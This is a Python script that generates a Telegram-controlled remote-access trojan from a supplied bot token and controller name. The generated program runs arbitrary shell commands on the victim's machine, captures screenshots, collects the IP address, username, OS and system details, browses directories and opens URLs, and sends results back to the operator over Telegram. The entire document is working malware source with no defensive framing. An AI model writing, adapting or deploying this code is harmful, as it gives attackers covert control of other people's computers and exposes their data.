#!/usr/bin/env python3
import sys


def server(api, user, output):
    enter = "n"
    bows = "{}"
    output = open(output,'w')
    output.write("""
#!/usr/bin/env python3
try:
    import telepot
    from telepot.loop import MessageLoop
    import pyscreenshot as ImageGrab
    from sysinfo import getsysinfo
    import getip
except ModuleNotFoundError:
    print("You must install telepot,pyscreenshot,sysinfo and getip2")
from time import sleep
import tkinter
from tkinter import messagebox
import subprocess
import webbrowser
import os
import platform

#=====================#
HTTPbased  = "{}"
UserControler = "{}"
#=====================#

def bot():
    return telepot.Bot(HTTPbased)

def SendMessage(idmsg, textmsg):
    try:
        BotSendMsg = bot()
        BotSendMsg.sendMessage(idmsg,
                               textmsg)
    except telepot.exception.TelegramError:
        pass

def SendImg(idimg, Photo):
    BotSendImg = bot()
    BotSendImg.sendPhoto(idimg, Photo)

def cmd(cmd):
    output = subprocess.run(cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            universal_newlines=True)
    return output.stdout

def lstdir():
    path = os.getcwd()
    listdir = os.listdir(path)
    list = "lsdir:"
    for file in listdir:
        list += ("\{}{}".format(file))
    return list
def MessageBox(title, message):
    root = tkinter.Tk()
    root.withdraw()
    messagebox.showinfo(title, message)

def ScreenShot():
    img_path = 'screenshot.png'
    ImageGrab.grab_to_file(img_path)
    readimg = open(img_path, 'rb')
    return readimg

def CheckOnline():
    IP = getip.get()
    login = os.getlogin()
    OS = platform.platform()
    info = (\"""
IP : {}
USER : {}
OS   : {}
\""".format(IP, login, OS))
    return info

def SystemInfo():
    output = getsysinfo()
    return output

def openbrowser(url):
    webbrowser.open(url)

def MessageAnalysis(msg):
    ip = getip.get()
    Msgtext, Msgtype, Msgid = telepot.glance(msg)
    #print("id:",Msgid)
    From = msg["from"]
    User = From["first_name"]
    if User == UserControler:
        if Msgtext == "text":
            Msg = str(msg['text'])
            Msg = Msg.split()
            if Msg[0] == "online?" :
                Online = CheckOnline()
                SendMessage(Msgid, Online)
            elif Msg[0] == ip or Msg[0] == "all":
                del Msg[0]
                if Msg[0] == "cmd":
                    del Msg[0]
                    cmnd = ' '.join(Msg)
                    outCmd = cmd(cmnd)
                    SendMessage(Msgid, outCmd)
                elif Msg[0] == "sysinfo":
                    sysinfo = SystemInfo()
                    SendMessage(Msgid, sysinfo)
                elif Msg[0] == "url":
                    del Msg[0]
                    browsermsg = ''.join(Msg)
                    openbrowser(browsermsg)
                elif Msg[0] == "ls":
                    outlist = lstdir()
                    SendMessage(Msgid, outlist)
                elif Msg[0] == "cd":
                    try:
                        os.chdir(Msg[1])
                        cdmsg = "Done"
                    except FileNotFoundError:
                        cdmsg = ("File not found: {}".format(Msg[1]))
                    SendMessage(Msgid, cdmsg)
                elif Msg[0] == "path":
                    path = os.getcwd()
                    SendMessage(Msgid, path)
                elif Msg[0] == "screenshot":
                    img = ScreenShot()
                    SendImg(Msgid, img)
                elif Msg[0] == "messagbox":
                    del Msg[0]
                    title = Msg[0]
                    del Msg[0]
                    message = ' '.join(Msg)
                    MessageBox(title, message)
    elif User != UserControler:
       SendMessage(Msgid, "You cant use this bot!") 


def main():
    BotMsgLoop = bot()
    MessageLoop(BotMsgLoop, MessageAnalysis).run_as_thread()

    while True:
        pass
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
""".format(api, user, enter, bows, bows, bows, bows, bows))
    output.close()
